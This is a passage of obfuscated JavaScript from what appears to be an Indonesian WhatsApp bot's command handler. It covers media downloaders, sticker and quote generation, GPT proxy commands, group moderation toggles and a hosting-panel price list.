          const _0x568360 = _0x410b0c(_0x593023);
          try {
            let _0x3c5134 = await yts(_0x43281f);
            let _0x7aa880 = _0x3c5134.videos[0];
            let {
              title: _0x3704ab,
              thumbnail: _0x1d2709,
              timestamp: _0x4fca2f,
              author: _0x35538c,
              url: _0x27cb7f
            } = _0x7aa880;
            const _0x2ed875 = ytdl(_0x27cb7f, {
              filter: "audioonly",
              quality: "highestaudio"
            });
            let _0x47a92e = await _0x46df6f(".mp3");
            let _0x3aee51 = "./all/tmp/" + _0x47a92e;
            const _0x14ea10 = fs.createWriteStream(_0x3aee51);
            await _0x568360(_0x2ed875, _0x14ea10);
            await _0x59b98d.sendMessage(_0x16d835.chat, {
              audio: fs.readFileSync(_0x3aee51),
              mimetype: "audio/mpeg",
              contextInfo: {
                externalAdReply: {
                  thumbnailUrl: _0x1d2709,
                  title: _0x3704ab,
                  body: "Duration : " + _0x4fca2f + " | Author : " + _0x35538c.name,
                  sourceUrl: _0x27cb7f,
                  renderLargerThumbnail: true,
                  mediaType: 1
                }
              }
            }, {
              quoted: _0x16d835
            });
            await fs.unlinkSync(_0x3aee51);
          } catch (_0x49d5e4) {
            return _0x16d835.reply(_0x49d5e4.toString());
          }
        }
        break;
      case "qc":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("teksnya"));
          }
          let _0x38e61e = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];
          let _0x348571 = await _0x38e61e[Math.floor(Math.random() * _0x38e61e.length)];
          _0x16d835.reply(msg.wait);
          const _0x4aba21 = {
            type: "quote",
            format: "png",
            backgroundColor: _0x348571,
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: 1,
                name: _0x16d835.pushName,
                photo: {
                  url: "https://files.catbox.moe/uiws75.jpg"
                }
              },
              text: _0x43281f,
              replyMessage: {}
            }]
          };
          const _0x29faa7 = _0x4aba21;
          const _0x33d125 = axios.post("https://bot.lyo.su/quote/generate", _0x29faa7, {
            headers: {
              "Content-Type": "application/json"
            }
          }).then(async _0x190e50 => {
            const _0x5e0845 = Buffer.from(_0x190e50.data.result.image, "base64");
            let _0x24e71a = _0x91e99f + ".png";
            await fs.writeFile(_0x24e71a, _0x5e0845, async _0x20e378 => {
              if (_0x20e378) {
                return _0x16d835.reply("Error");
              }
              const _0x33ff6a = {
                packname: namabot
              };
              await _0x59b98d.sendStimg(_0x16d835.chat, _0x24e71a, _0x16d835, _0x33ff6a);
              fs.unlinkSync("./" + _0x24e71a);
            });
          });
        }
        break;
      case "list_vps":
        {
          let _0x36021c = "Belum Tersedia";
          const _0x40ffd4 = {
            text: _0x36021c
          };
          const _0xdd6070 = {
            quoted: _0xfff411
          };
          _0x59b98d.sendMessage(_0x16d835.chat, _0x40ffd4, _0xdd6070);
        }
        break;
      case "list_domain":
        {
          let _0x2b239f = "Belum Tersedia";
          const _0x352c7b = {
            text: _0x2b239f
          };
          const _0x413bea = {
            quoted: _0xfff411
          };
          _0x59b98d.sendMessage(_0x16d835.chat, _0x352c7b, _0x413bea);
        }
        break;
        break;
      case "list_panel":
        {
          const _0x506219 = "*List Harga Panel By " + namaowner + " ⚡*\n\n*📌1GB CPU 40%*\n_HARGA : RP1.000_\n\n*📌2GB CPU 60%*\n_HARGA : RP2.000_\n\n*📌3GB CPU 80%* \n_HARGA : RP3.000_\n\n*📌4GB CPU 100%* \n_HARGA : RP4.000_\n\n*📌5GB CPU 120%* \n_HARGA : RP5.000_\n\n*📌6GB CPU 140%* \n_HARGA : RP6.000_\n\n*📌7GB CPU 160%* \n_HARGA : RP7.000_\n\n*📌8GB CPU 180%*\n_HARGA : RP8.000_\n\n*📌9GB CPU 200%* \n_HARGA RP9.000\n*📌UNLI CPU UNLI* \n_HARGA : RP10.00_\n\n*Keuntungan Panel :*\n* Bisa Buat Panel Sepuasnya\n* Bisa Jual Panel Sepuasnya\n* Server *(High Quality)*\n* Bot Auto Fast Respon\n* Garansi Aktif 7 Hari\n* Claim Garansi Wajib Bawa Bukti Transaksi!\n\n*Ready Resseller Panel*\n* *Harga :* Rp5.000/per minggu\n* *Harga :* Rp7.000/per bulan\n* *Harga :* Rp10.000/Permanen\n\n*Ready Admin Panel*\n* *Harga :* Rp15.000/Per bulan\n* *Harga :* Rp20.000/Permanen\n\n*Dan Ready Juga Pt panel\n* *Harga :* Rp25.000/Permanen\n* Create Panel Lewat Bot\n\nMinat ? Hubungi Ownerbot Dengan Cara Ketik *.owner*\n\n";
          const _0x131984 = {
            text: _0x506219
          };
          const _0x150a2f = {
            quoted: _0xfff411
          };
          _0x59b98d.sendMessage(_0x16d835.chat, _0x131984, _0x150a2f);
        }
        break;
      case "list_scbot":
        {
          let _0x439e99 = "Belum Tersedia";
          const _0x128ec2 = {
            text: _0x439e99
          };
          const _0x4e7c1e = {
            quoted: _0xfff411
          };
          _0x59b98d.sendMessage(_0x16d835.chat, _0x128ec2, _0x4e7c1e);
        }
        break;
      case "remini":
      case "tohd":
      case "hd":
        {
          if (/image/g.test(_0x3177c1)) {
            _0x16d835.reply(msg.wait);
            let _0x463ac4;
            if (/remini/gi.test(_0x3e5c8f)) {
              _0x463ac4 = 4;
            }
            if (/tohd|hd/gi.test(_0x3e5c8f)) {
              _0x463ac4 = 2;
            }
            await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32).then(async _0x5cd455 => {
              let _0x217d6d = await _0x111118(_0x5cd455);
              let _0x593c0e = await _0x1b3529("https://aemt.me/remini?url=" + _0x217d6d + "&resolusi=" + _0x463ac4);
              if (!_0x593c0e.status) {
                return _0x16d835.reply("Error!");
              }
              const _0x2a6ae1 = {
                url: _0x593c0e.url
              };
              const _0x3f4cc7 = {
                image: _0x2a6ae1,
                caption: "Berhasil ✅"
              };
              await _0x59b98d.sendMessage(_0x16d835.chat, _0x3f4cc7, {
                quoted: _0x16d835
              });
              await fs.unlinkSync(_0x5cd455);
            }).catch(_0x43997c => _0x16d835.reply(_0x43997c.toString()));
          } else {
            return _0x16d835.reply(_0x286488("dengan mengirim foto"));
          }
        }
        break;
      case "chatgpt":
      case "gpt":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("apa itu nodejs"));
          }
          _0x16d835.reply(msg.wait);
          await _0x1b3529("https://aemt.me/gpt4?text=" + _0x43281f).then(_0x3dca39 => {
            if (!_0x3dca39.status) {
              return _0x16d835.reply(JSON.stringify(_0x3dca39, null, 2));
            }
            var _0x3b51ec = "*© GPT - Chat Version 0.4*\n\n" + _0x3dca39.result;
            _0x16d835.reply(_0x3b51ec);
          });
        }
        break;
      case "ai":
      case "openai":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("kamu siapa"));
          }
          _0x16d835.reply(msg.wait);
          await _0x1b3529("https://aemt.me/openai?text=" + _0x43281f).then(_0x775d46 => {
            if (!_0x775d46.status) {
              return _0x16d835.reply(JSON.stringify(_0x775d46, null, 2));
            }
            var _0x4d2e2c = "*© AI - Asistent New Latest*\n\n" + _0x775d46.result;
            _0x16d835.reply(_0x4d2e2c);
          });
        }
        break;
      case "toptv":
        {
          if (/video/.test(_0x250d32.mimetype)) {
            if (_0x250d32.seconds > 30) {
              return _0x16d835.reply("Durasi vidio maksimal 30 detik!");
            }
            const _0x4fba31 = {
              ptvMessage: _0x250d32
            };
            let _0x491efa = await generateWAMessageFromContent(_0x16d835.chat, proto.Message.fromObject(_0x4fba31), {
              userJid: _0x16d835.chat,
              quoted: _0x16d835
            });
            _0x59b98d.relayMessage(_0x16d835.chat, _0x491efa.message, {
              messageId: _0x491efa.key.id
            });
          } else {
            return _0x16d835.reply(_0x286488("dengam mengirim/balas vidio"));
          }
        }
        break;
      case "toimage":
        {
          if (!/webp/.test(_0x3177c1) && !/audio/.test(_0x3177c1)) {
            return _0x16d835.reply(_0x286488("dengan reply sticker"));
          }
          _0x16d835.reply(msg.wait);
          let _0x36ed8e = await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32);
          let _0xd83f51 = _0x91e99f + ".png";
          exec("ffmpeg -i " + _0x36ed8e + " " + _0xd83f51, _0x24a274 => {
            fs.unlinkSync(_0x36ed8e);
            if (_0x24a274) {
              return _0x24a274;
            }
            let _0x57aff0 = fs.readFileSync(_0xd83f51);
            const _0x2afad1 = {
              image: _0x57aff0
            };
            _0x59b98d.sendMessage(_0x16d835.chat, _0x2afad1, {
              quoted: _0x16d835
            });
            fs.unlinkSync(_0xd83f51);
          });
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video|audio/.test(_0x3177c1) && !/audio/.test(_0x3177c1)) {
            return _0x16d835.reply(_0x286488("dengan mengirim audio/vidio"));
          }
          _0x16d835.reply(msg.wait);
          await _0x59b98d.downloadMediaMessage(_0x250d32).then(async _0x5c9bf2 => {
            let _0x415605 = await _0x54d44e(_0x5c9bf2, "mp4");
            const _0x5d815f = {
              audio: _0x415605,
              mimetype: "audio/mpeg",
              ptt: true
            };
            _0x59b98d.sendMessage(_0x16d835.chat, _0x5d815f, {
              quoted: _0x16d835
            });
          });
        }
        break;
      case "toaudio":
      case "tomp3":
        {
          if (!/video/.test(_0x3177c1) && !/audio/.test(_0x3177c1)) {
            return _0x16d835.reply(_0x286488("dengan mengirim vidio"));
          }
          if (_0x250d32.seconds > 30) {
            return _0x16d835.reply("Durasi vidio maksimal 30 detik");
          }
          _0x16d835.reply(msg.wait);
          await _0x59b98d.downloadMediaMessage(_0x250d32).then(async _0x4cb747 => {
            let _0x36e359 = await _0x20044e(_0x4cb747, "mp4");
            const _0x356d4f = {
              audio: _0x36e359,
              mimetype: "audio/mpeg"
            };
            _0x59b98d.sendMessage(_0x16d835.chat, _0x356d4f, {
              quoted: _0x16d835
            });
          });
        }
        break;
      case "sticker":
      case "stiker":
      case "sgif":
      case "s":
        {
          if (!/image|video/.test(_0x3177c1)) {
            return _0x16d835.reply(_0x286488("dengan mengirim foto/vidio"));
          }
          if (/video/.test(_0x3177c1)) {
            if (_0x250d32.seconds > 15) {
              return _0x16d835.reply("Durasi vidio maksimal 15 detik!");
            }
          }
          _0x16d835.reply(msg.wait);
          var _0x2c1889 = await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32);
          const _0x19cadc = {
            packname: global.packname
          };
          await _0x59b98d.sendStimg(_0x16d835.chat, _0x2c1889, _0x16d835, _0x19cadc);
          await fs.unlinkSync(_0x2c1889);
        }
        break;
      case "tourl":
        {
          if (!/image/.test(_0x3177c1)) {
            return _0x16d835.reply(_0x286488("dengan mengirim foto"));
          }
          await _0x16d835.reply(msg.wait);
          var _0x136d1f = await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32);
          var _0x12c15c = await _0x111118(_0x136d1f);
          await _0x16d835.reply("Link Tautan :\n" + _0x12c15c);
          await fs.unlinkSync(_0x136d1f);
        }
        break;
      case "public":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          _0x59b98d.public = true;
          _0x16d835.reply("Berhasil mengganti mode bot menjadi *Public*");
        }
        break;
      case "self":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          _0x59b98d.public = false;
          _0x16d835.reply("Berhasil mengganti mode bot menjadi *Self*");
        }
        break;
      case "get":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply("linknya");
          }
          try {
            var _0x2037b3 = await _0x1b3529(_0x43281f);
            _0x16d835.reply(JSON.stringify(_0x2037b3, null, 2));
          } catch (_0x12fdaf) {
            return _0x16d835.reply(_0x12fdaf.toString());
          }
        }
        break;
      case "setteksjpm":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (_0x43281f || _0x16d835.quoted) {
            const _0x194af2 = _0x16d835.quoted ? _0x16d835.quoted.text : _0x43281f;
            await fs.writeFileSync("./all/database/teksjpm.js", _0x194af2.toString());
            _0x16d835.reply("Berhasil Mengganti Teks JPM ✅");
          } else {
            return _0x16d835.reply(_0x286488("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"));
          }
        }
        break;
      case "teksjpm":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          _0x16d835.reply(fs.readFileSync("./all/database/teksjpm.js").toString());
        }
        break;
      case "instagram":
      case "igdl":
      case "ig":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("linknya"));
          }
          if (!_0x43281f.includes("instagram.com")) {
            return _0x16d835.reply("Link tautan tidak valid!");
          }
          _0x16d835.reply(msg.wait);
          await api.igdl("" + _0x43281f).then(_0x3a0e22 => {
            for (let _0x1fe77d of _0x3a0e22.result) {
              _0x59b98d.sendMedia(_0x16d835.chat, _0x1fe77d.url, _0x16d835, {
                caption: "Instagram Downloader Done ✅"
              });
            }
          }).catch(_0x24c181 => _0x16d835.reply(_0x24c181.toString()));
        }
        break;
      case "tiktokaudio":
      case "tiktokmp3":
      case "ttaudio":
      case "ttmp3":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("linknya"));
          }
          if (!_0x43281f.includes("tiktok.com")) {
            return _0x16d835.reply("Link tautan tidak valid!");
          }
          _0x16d835.reply(msg.wait);
          await _0x1b3529("https://aemt.me/download/tiktokdl?url=" + _0x43281f).then(_0x5e5cea => {
            const _0x36be18 = {
              url: _0x5e5cea.result.music
            };
            const _0x3c385b = {
              audio: _0x36be18,
              mimetype: "audio/mpeg"
            };
            _0x59b98d.sendMessage(_0x16d835.chat, _0x3c385b, {
              quoted: _0x16d835
            });
          }).catch(_0x408dc9 => _0x16d835.reply(_0x408dc9.toString()));
        }
        break;
      case "tiktokslide":
      case "ttslide":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("linknya"));
          }
          if (!_0x43281f.includes("tiktok.com")) {
            return _0x16d835.reply("Link tautan tidak valid!");
          }
          _0x16d835.reply(msg.wait);
          await _0x1b3529("https://aemt.me/download/tiktokslide?url=" + _0x43281f).then(async _0x3a6c51 => {
            if (!_0x3a6c51.status) {
              return _0x16d835.reply(JSON.stringify(_0x3a6c51, null, 2));
            }
            if (_0x3a6c51.result.totalSlide == 0) {
              return _0x16d835.reply("Link Tiktok Bukan Slide!");
            }
            var _0xbdfa82 = "*Tiktok Downloader Done ✅*";
            for (let _0xd9c8c0 of _0x3a6c51.result.images) {
              const _0xef4baf = {
                url: "" + _0xd9c8c0
              };
              const _0x466131 = {
                image: _0xef4baf,
                caption: _0xbdfa82
              };
              _0x59b98d.sendMessage(_0x16d835.chat, _0x466131, {
                quoted: _0x16d835
              });
            }
          }).catch(_0x146ef0 => _0x16d835.reply(_0x146ef0.toString()));
        }
        break;
      case "mediafire":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("linknya"));
          }
          if (!_0x43281f.includes("mediafire.com")) {
            return _0x16d835.reply("Link Tautan Tidak Valid!");
          }
          _0x16d835.reply(msg.wait);
          await api.mediafireDl(_0x43281f).then(_0x55f564 => {
            if (_0x55f564.filesize.includes("GB")) {
              return _0x16d835.reply("Gagal mendownload, ukuran file terlalu besar");
            }
            if (_0x55f564.filesize.split("MB")[0] >= 100) {
              return _0x16d835.reply("Gagal mendownload, ukuran file terlalu besar");
            }
            if (_0x55f564.url == "") {
              return _0x16d835.reply(mess.error);
            }
            const _0x228a2a = {
              url: _0x55f564.url
            };
            _0x59b98d.sendMessage(_0x16d835.chat, {
              document: _0x228a2a,
              fileName: _0x55f564.filename,
              mimetype: "application/" + _0x55f564.ext.toLowerCase(),
              caption: "Download Berhasil ✅"
            }, {
              quoted: _0x16d835
            });
          }).catch(_0x37ac55 => _0x16d835.reply(_0x37ac55.toString()));
        }
        break;
      case "pinterest":
      case "pin":
        {
          if (!_0x43281f) {
            return _0x16d835.reply("Mana text nya?");
          }
          const {
            GOOGLE_IMG_SCRAP: _0x5715a6
          } = require("google-img-scrap");
          let _0x31b53f = await _0x5715a6({
            search: _0x43281f,
            limit: 6,
            domains: ["pinterest.com"]
          });
          let _0xe6b1ad = _0x31b53f.result;
          let _0x3a5946 = _0x31b53f.result.length;
          if (_0x3a5946 == 0) {
            return _0x16d835.reply("Hasil tidak di temukan");
          }
          let _0x2a1ac8 = () => {
            if (_0x3a5946 > 5) {
              return 5;
            } else {
              return _0x3a5946;
            }
          };
          let _0x2f07d8 = _0x2a1ac8();
          let _0x38678e = [];
          for (let _0x13e1c4 = 0; _0x13e1c4 < _0x2f07d8; _0x13e1c4++) {
            const _0x358e91 = {
              upload: _0x59b98d.waUploadToServer
            };
            let _0x2e72b2 = {
              header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({
                  image: await _0x51fae7(_0xe6b1ad[_0x13e1c4].url)
                }, _0x358e91)),
                title: "*[PINTEREST SEARCH]*",
                gifPlayback: true,
                subtitle: "",
                hasMediaAttachment: false
              }),
              body: {
                text: "Hasil " + (_0x13e1c4 + 1) + " pinterest"
              },
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{\"display_text\":\"Link\",\"url\":\"" + _0xe6b1ad[_0x13e1c4].url + "\",\"merchant_url\":\"https://www.google.co.id\"}"
                }]
              })
            };
            _0x38678e.push(_0x2e72b2);
            await sleep(2000);
          }
          const _0x5708a1 = {
            cards: _0x38678e,
            messageVersion: 1
          };
          let _0x492cfe = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: {
                    text: "*Berikut Hasil Pencarian Anda*"
                  },
                  carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create(_0x5708a1)
                })
              }
            }
          }, {});
          await _0x59b98d.relayMessage(_0x492cfe.key.remoteJid, _0x492cfe.message, {
            messageId: _0x492cfe.key.id
          });
        }
        break;
      case "tiktok":
      case "tt":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("linknya"));
          }
          if (!/tiktok.com/.test(_0x43281f)) {
            return _0x16d835.reply("Link Tautan Tidak Valid!");
          }
          _0x16d835.reply(msg.wait);
          let _0x23aaab = _0x43281f;
          await api.tiktok(_0x23aaab).then(async _0x102447 => {
            var _0x32af8f = "*Tiktok Downloader Done ✅*";
            if (_0x102447.result.duration == 0) {
              for (let _0x31c52b of _0x102447.result.images) {
                const _0x2aeb3f = {
                  url: "" + _0x31c52b
                };
                const _0x3d1a1f = {
                  image: _0x2aeb3f,
                  caption: _0x32af8f
                };
                _0x59b98d.sendMessage(_0x16d835.chat, _0x3d1a1f, {
                  quoted: _0x16d835
                });
              }
            } else {
              const _0x148d15 = {
                url: _0x102447.result.play
              };
              const _0x2c0ac2 = {
                video: _0x148d15,
                mimetype: "video/mp4",
                caption: _0x32af8f
              };
              await _0x59b98d.sendMessage(_0x16d835.chat, _0x2c0ac2, {
                quoted: _0x16d835
              });
            }
          }).catch(_0x11d045 => _0x16d835.reply(_0x11d045.toString));
        }
        break;
      case "facebook":
      case "fb":
      case "fbdl":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("linkvidionya"));
          }
          if (!/facebook.com/.test(_0x43281f)) {
            return _0x16d835.reply("Link Tautan Tidak Valid!");
          }
          _0x16d835.reply(msg.wait);
          await _0x1b3529("https://aemt.me/download/fbdown?url=" + _0x43281f).then(_0x292482 => {
            if (!_0x292482.status) {
              return _0x16d835.reply(JSON.stringify(_0x292482, null, 2));
            }
            _0x59b98d.sendMessage(_0x16d835.chat, {
              video: {
                url: "" + (_0x292482.result.url.isHdAvailable == true ? _0x292482.result.url.urls[0].hd : _0x292482.result.url.urls[0].sd)
              },
              mimetype: "video/mp4",
              caption: "*Facebook Downloader Done ✅*"
            }, {
              quoted: _0x16d835
            });
          }).catch(_0xc425a8 => _0x16d835.reply(_0xc425a8.toString()));
        }
        break;
      case "owner":
        {
          _0x59b98d.sendContact(_0x16d835.chat, [owner], "Developer Bot WhatsApp", null, {
            contextInfo: {
              mentionedJid: [_0x16d835.sender],
              externalAdReply: {
                showAdAttribution: true,
                thumbnail: await fs.readFileSync("./media/owner.jpg"),
                title: "© Copyright " + global.namabot,
                renderLargerThumbnail: true,
                sourceUrl: global.linkyt,
                mediaType: 1
              }
            }
          });
        }
        break;
      case "antilink":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x1d834a && !_0x515108) {
            return _0x3abc22(msg.admin);
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"));
          }
          if (/on/.test(_0x57e1e7[0].toLowerCase())) {
            if (_0xba61f4.includes(_0x16d835.chat)) {
              return _0x16d835.reply("*Antilink* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini");
            }
            if (_0x362037.includes(_0x16d835.chat)) {
              let _0x17ff7d = _0x362037.indexOf(_0x16d835.chat);
              _0x362037.splice(_0x17ff7d, 1);
              await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(_0x362037));
            }
            _0xba61f4.push(_0x16d835.chat);
            await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(_0xba61f4));
            _0x16d835.reply("Berhasil Menyalakan *Antilink* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini");
          } else if (/off/.test(_0x57e1e7[0].toLowerCase())) {
            if (!_0xba61f4.includes(_0x16d835.chat)) {
              return _0x16d835.reply("*Antilink* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini");
            }
            let _0x476c0d = _0xba61f4.indexOf(_0x16d835.chat);
            _0xba61f4.splice(_0x476c0d, 1);
            await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(_0xba61f4));
            _0x16d835.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini");
          } else {
            return _0x16d835.reply(_0x286488("on/off"));
          }
        }
        break;
      case "antilinkV2":
      case "antilinkv2":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x1d834a && !_0x515108) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"));
          }
          if (/on/.test(_0x57e1e7[0].toLowerCase())) {
            if (_0x362037.includes(_0x16d835.chat)) {
              return _0x16d835.reply("*AntilinkV2* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini");
            }
            if (_0xba61f4.includes(_0x16d835.chat)) {
              let _0x4e53f3 = _0xba61f4.indexOf(_0x16d835.chat);
              _0xba61f4.splice(_0x4e53f3, 1);
              await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(_0xba61f4));
            }
            _0x362037.push(_0x16d835.chat);
            await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(_0x362037));
            _0x16d835.reply("Berhasil Menyalakan *AntilinkV2* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini");
          } else if (/off/.test(_0x57e1e7[0].toLowerCase())) {
            if (!_0x362037.includes(_0x16d835.chat)) {
              return _0x16d835.reply("*AntilinkV2* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini");
            }
            let _0x37d7a9 = _0x362037.indexOf(_0x16d835.chat);
            _0x362037.splice(_0x37d7a9, 1);
            await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(_0x362037));
            _0x16d835.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Inii");
          } else {
            return _0x16d835.reply(_0x286488("on/off"));
          }
        }
        break;
      case "welcome":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"));
          }
          if (_0x43281f.toLowerCase() == "on") {
            if (welcome) {
              return _0x16d835.reply("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
            }
            welcome = true;
            _0x16d835.reply("Berhasil Menyalakan *Welcome ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
          } else if (_0x43281f.toLowerCase() == "off") {
            if (!welcome) {
              return _0x16d835.reply("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
            }
            welcome = false;
            _0x16d835.reply("Berhasil Mematikan *Welcome ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
          } else {
            return _0x16d835.reply(_0x286488("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"));
          }
        }
        break;
      case "autoread":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"));
          }
          if (_0x43281f.toLowerCase() == "on") {
            if (autoread) {
              return _0x16d835.reply("*Autoread* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
            }
            autoread = true;
            _0x16d835.reply("Berhasil Menyalakan *Autoread ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
          } else if (_0x43281f.toLowerCase() == "off") {
            if (!autoread) {
              return _0x16d835.reply("*Autoread* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
            }
            autoread = false;
            _0x16d835.reply("Berhasil Mematikan *Autoread ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
          } else {
            return _0x16d835.reply(_0x286488("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"));
          }
        }
        break;
      case "anticall":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"));
          }
          if (_0x43281f.toLowerCase() == "on") {
            if (anticall) {
              return _0x16d835.reply("*Anticall* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
            }
            anticall = true;
            _0x16d835.reply("Berhasil Menyalakan *Anticall ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
          } else if (_0x43281f.toLowerCase() == "off") {
            if (!anticall) {
              return _0x16d835.reply("*Anticall* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
            }
            anticall = false;
            _0x16d835.reply("Berhasil Mematikan *Anticall ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot");
          } else {
            return _0x16d835.reply(_0x286488("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"));
          }
        }
        break;
      case "setting":
      case "settingbot":
      case "option":
      case "statusbot":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          var _0x487964 = "\n*List Status Bot Settings :*\n\n* Autoread : " + (global.autoread ? "*Aktif ✅*" : "*Tidak Aktif ❌*") + "\n* Anticall : " + (global.anticall ? "*Aktif ✅*" : "*Tidak Aktif ❌*") + "\n* Welcome : " + (global.welcome ? "*Aktif ✅*" : "*Tidak Aktif ❌*") + "\n\n*Contoh Penggunaan :*\nKetik *.autoread* on/off";
          _0x16d835.reply(_0x487964);
        }
        break;
      case "statusgc":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x1d834a && !_0x515108) {
            return _0x3abc22(msg.admin);
          }
          var _0x1859b7 = "Aktif ✅";
          var _0x11d5d2 = "Aktif ✅";
          if (!_0x362037.includes(_0x16d835.chat)) {
            _0x11d5d2 = "Tidak Aktif ❌";
          }
          if (!_0xba61f4.includes(_0x16d835.chat)) {
            _0x1859b7 = "Tidak Aktif ❌";
          }
          var _0x487964 = "\n*List Status Grup Settings :*\n\n* Antilink : *" + _0x1859b7 + "*\n* AntilinkV2 : *" + _0x11d5d2 + "*\n\n*Contoh Penggunaan :*\nKetik *.antilink* on/off\n";
          _0x59b98d.senText(_0x16d835.chat, _0x487964, _0x143656);
        }
        break;
      case "setppgc":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x104099) {
            return _0x3abc22(msg.adminbot);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          if (/image/g.test(_0x3177c1)) {
            let _0x47435f = await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32);
            const _0x360e62 = {
              url: _0x47435f
            };
            await _0x59b98d.updateProfilePicture(_0x16d835.chat, _0x360e62);
            await fs.unlinkSync(_0x47435f);
            _0x16d835.reply("Berhasil Mengganti *Profil* Grup");
          } else {
            return _0x16d835.reply(_0x286488("dengan mengirim foto"));
          }
        }
        break;
      case "setnamegc":
      case "setnamagc":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x104099) {
            return _0x3abc22(msg.adminbot);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("teksnya"));
          }
          const _0x2b73f8 = metadata.subject;
          await _0x59b98d.groupUpdateSubject(_0x16d835.chat, _0x43281f);
          _0x16d835.reply("Berhasil Mengganti Nama Grup *" + _0x2b73f8 + "* Menjadi *" + _0x43281f + "*");
        }
        break;
      case "setdesc":
